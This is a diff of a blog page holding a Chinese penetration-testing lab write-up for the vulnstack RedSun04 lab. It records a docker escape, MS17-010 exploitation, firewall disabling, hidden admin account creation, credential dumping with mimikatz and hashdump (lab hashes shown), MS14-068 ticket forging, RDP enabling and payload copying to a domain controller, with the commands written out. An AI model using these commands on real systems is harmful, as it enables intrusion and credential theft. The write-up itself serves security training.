@@ -16,12 +16,12 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介开始时间 2024-2-19 15:23 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008  网络创建两个虚拟网卡  保证内网 发现保证">
+    <meta name="description" content="简介开始时间 2024-2-19 15:23 完成时间 2024-2-21 17:25 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RedSun04">
 <meta property="og:url" content="https://tsy244.github.io/2024/02/19/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun04/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="简介开始时间 2024-2-19 15:23 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008  网络创建两个虚拟网卡  保证内网 发现保证">
+<meta property="og:description" content="简介开始时间 2024-2-19 15:23 完成时间 2024-2-21 17:25 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154516050.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155320775.png">
@@ -71,8 +71,46 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219174931042.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175133036.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175251544.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220182130456.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220181950321.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220185019318.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220191452955.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220194825593.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220213928235.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220222820111.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230524037.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230610483.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230358605.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220231524587.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221093506313.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141115003.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154905398.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110842373.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110927040.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221094832427.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221095717036.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141510896.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221102305247.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221111417407.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221131928500.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143614860.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143916232.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221151759600.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221153843345.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154112172.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154323860.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221155552743.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160333290.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160533542.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221161502528.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221162432930.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165050569.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165301837.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221165559108.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221171054574.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221172419610.png">
 <meta property="article:published_time" content="2024-02-19T07:23:34.000Z">
-<meta property="article:modified_time" content="2024-02-20T07:54:36.231Z">
+<meta property="article:modified_time" content="2024-02-21T09:25:10.468Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -276,7 +314,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k words
+          7.6k words
         
       </span>
     
@@ -287,7 +325,7 @@
         
         
         
-          33 mins
+          63 mins
         
       </span>
     
@@ -331,6 +369,7 @@
               <div class="markdown-body">
                 
                 <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>开始时间 2024-2-19 15:23</p>
+<p>完成时间 2024-2-21 17:25</p>
 <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://39.98.79.56/vuln/detail/6/﻿</a></p>
 <p>共有三台主机DC、WEB、WIN7</p>
 <h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>主机密码</p>
@@ -512,7 +551,205 @@
 <p>发现这个是docker </p>
 <p>尝试docker 逃逸</p>
 <blockquote>
+<p><a href="https://tsy244.github.io/2024/02/19/%E6%B8%97%E9%80%8F/docker%E9%80%83%E9%80%B8/">docker逃逸 - AU9U5T (tsy244.github.io)</a></p>
 </blockquote>
+<p>尝试使用s2 的shell 逃逸</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220182130456.png" srcset="/img/loading.gif" lazyload alt="image-20240220182130456"></p>
+<p>发现使用特权逃逸的方式失败</p>
+<p>尝试使用tomcat 逃逸</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220181950321.png" srcset="/img/loading.gif" lazyload alt="image-20240220181950321"></p>
+<p>发现成功</p>
+<p>kali 开启监听，用于接受定时任务反弹的shell </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220185019318.png" srcset="/img/loading.gif" lazyload alt="image-20240220185019318"></p>
+<p>反弹成功</p>
+<p>下载payload 然后执行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220191452955.png" srcset="/img/loading.gif" lazyload alt="image-20240220191452955"></p>
+<p>反弹成功<br>开启代理</p>
+<p>终于开始信息收集了</p>
+<p>查看ip 地址</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220194825593.png" srcset="/img/loading.gif" lazyload alt="image-20240220194825593"></p>
+</li>
+<li><p>存活探测</p>
+<p>发现还有一个 192.168.183.128 的地址  使用fscan </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220213928235.png" srcset="/img/loading.gif" lazyload alt="image-20240220213928235"></p>
+<p>代理确保开启成功但是扫不出东西，有点怪</p>
+<p>尝试使用nmap</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span>  nmap -sP -Pn <span class="hljs-number">192.168.183.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>结果有点怪</p>
+<p>发现kali 使用admin 的时候没有没有使用root，所以出现这个情况</p>
+<p>尝试使用root 权限</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220222820111.png" srcset="/img/loading.gif" lazyload alt="image-20240220222820111"></p>
+<p>一下就过了，还有就是nmap 的不建议使用全端口扫描容易出问题</p>
+<p>发现</p>
+<blockquote>
+<p>192.168.183.130</p>
+<p>192.168.183.131</p>
+</blockquote>
+<p>都是存过的</p>
+</li>
+<li><p>端口扫描</p>
+<p>192.168.183.130</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230524037.png" srcset="/img/loading.gif" lazyload alt="image-20240220230524037"></p>
+<p>192.168.183.131</p>
+</li>
+</ol>
+<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><ol>
+<li><p>尝试利用fscan 发现ms17_010</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230610483.png" srcset="/img/loading.gif" lazyload alt="image-20240220230610483"></p>
+<p>192.168.183.131</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220230358605.png" srcset="/img/loading.gif" lazyload alt="image-20240220230358605"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220231524587.png" srcset="/img/loading.gif" lazyload alt="image-20240220231524587"></p>
+<p>发现存在但是打不下来</p>
+<p>打了好几次</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221093506313.png" srcset="/img/loading.gif" lazyload alt="image-20240221093506313"></p>
+<p>好几次之后，发现成功</p>
+</li>
+<li><p>迁移到一个域用户的进程</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141115003.png" srcset="/img/loading.gif" lazyload alt="image-20240221141115003"></p>
+</li>
+<li><p>关闭防火墙</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">NetSh Advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154905398.png" srcset="/img/loading.gif" lazyload alt="image-20240221154905398"></p>
+</li>
+<li><p>创建用户</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ hackHACK123 /<span class="hljs-keyword">add</span> &amp;&amp; net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110842373.png" srcset="/img/loading.gif" lazyload alt="image-20240221110842373"></p>
+<p>账户密码不行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221110927040.png" srcset="/img/loading.gif" lazyload alt="image-20240221110927040"></p>
+<p>成功</p>
+</li>
+<li><p>将win7 传给cs</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221094832427.png" srcset="/img/loading.gif" lazyload alt="image-20240221094832427"></p>
+<p>直接就是system 权限都不需要提权</p>
+<p>传动失败</p>
+</li>
+<li><p>抓密码</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221095717036.png" srcset="/img/loading.gif" lazyload alt="image-20240221095717036"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221141510896.png" srcset="/img/loading.gif" lazyload alt="image-20240221141510896"></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">NTML   <span class="hljs-keyword">bc23b0b4d5bf5ff42bc61fb62e13886e</span><br><span class="hljs-keyword"></span>douser  Dotest123<br><br>douser        DEMO             <span class="hljs-keyword">bc23b0b4d5bf5ff42bc61fb62e13886e </span> c48096437367aad00ac2dc70552051cd84912a55<br><br></code></pre></td></tr></table></figure>
+
+<p>猜测这个是域用户</p>
+</li>
+<li><p>IPC$ 横向移动</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">183.130</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>douser <span class="hljs-string">&quot;Dotest123&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现失败</p>
+<p>这个用户权限应该不高</p>
+</li>
+<li><p>wmic 横向移动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.183.130 /user:douser /password:Dotest123 process list brief<br></code></pre></td></tr></table></figure>
+
+<p>失败，还是用户的问题</p>
+</li>
+<li><p>尝试PTH</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Administrator:<span class="hljs-number">500</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br>Guest:<span class="hljs-number">501</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">31</span>d<span class="hljs-number">6</span>cfe<span class="hljs-number">0</span>d<span class="hljs-number">16</span>ae<span class="hljs-number">931</span>b<span class="hljs-number">73</span><span class="hljs-keyword">c</span><span class="hljs-number">59</span>d<span class="hljs-number">7e0</span><span class="hljs-keyword">c</span><span class="hljs-number">089</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>:::<br><span class="hljs-symbol">testclone:</span><span class="hljs-number">1001</span>:aad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>eeaad<span class="hljs-number">3</span>b<span class="hljs-number">435</span>b<span class="hljs-number">51404</span>ee:<span class="hljs-number">8</span>d<span class="hljs-number">8e04036</span>d<span class="hljs-number">33</span>ed<span class="hljs-number">20</span>f<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>f<span class="hljs-number">6</span>ad<span class="hljs-number">77e28</span>bb<span class="hljs-number">7</span>:::<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221102305247.png" srcset="/img/loading.gif" lazyload alt="image-20240221102305247"></p>
+<p>失败</p>
+<p>尝试使用mimikatz</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:douser /domain:192.168.183.130 /ntlm:bc23b0b4d5bf5ff42bc61fb62e13886e&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>尝试开启3389</p>
+</li>
+</ol>
+   <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221111417407.png" srcset="/img/loading.gif" lazyload alt="image-20240221111417407">&#x3D;</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221131928500.png" srcset="/img/loading.gif" lazyload alt="image-20240221131928500"></p>
+<p>   看到了mimikakz 应该是防止我们二次上传</p>
+<p>   mimikakz 感觉获取的信息会比msf 里面的多一些，个人觉得</p>
+   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br>sekurlsa::logonpassword<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143614860.png" srcset="/img/loading.gif" lazyload alt="image-20240221143614860"></p>
+<p>   忘记设置log了，这个不太好复制</p>
+   <figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">log</span> <span class="hljs-keyword">ret</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221143916232.png" srcset="/img/loading.gif" lazyload alt="image-20240221143916232"></p>
+   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SID</span>:  S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span><br></code></pre></td></tr></table></figure>
+
+<p>   尝试使用sid + mimikatz 制作</p>
+<p>   现在可以尝试使用MS14-068 制作凭证</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221151759600.png" srcset="/img/loading.gif" lazyload alt="image-20240221151759600"></p>
+   <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u douser@DEMO.COM -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192.168.183.130</span> -p Dotest123<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221153843345.png" srcset="/img/loading.gif" lazyload alt="image-20240221153843345"></p>
+<p>   清楚票据</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154112172.png" srcset="/img/loading.gif" lazyload alt="image-20240221154112172"></p>
+<p>   将票据注入内存</p>
+   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptc <span class="hljs-string">&quot;TGT_douser@DEMO.COM.ccache&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221154323860.png" srcset="/img/loading.gif" lazyload alt="image-20240221154323860"></p>
+<p>   net use 传递文件</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221155552743.png" srcset="/img/loading.gif" lazyload alt="image-20240221155552743"></p>
+<p>   制作一个payload</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160333290.png" srcset="/img/loading.gif" lazyload alt="image-20240221160333290"></p>
+<p>   重新开启远程桌面</p>
+   <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">proxychains rdesktop <span class="hljs-number">192.168</span><span class="hljs-number">.183</span><span class="hljs-number">.133</span> -r disk:wj=<span class="hljs-regexp">/home/</span>kali <br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221160533542.png" srcset="/img/loading.gif" lazyload alt="image-20240221160533542"></p>
+<p>   将这个传给域控</p>
+   <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">copy</span> w_bind_10669.exe \\WIN<span class="hljs-literal">-ENS2VR5TR3N</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240221161502528.png" srcset="/img/loading.gif" lazyload alt="image-20240221161502528"></p>
+<p>   wmic 横向移动</p>
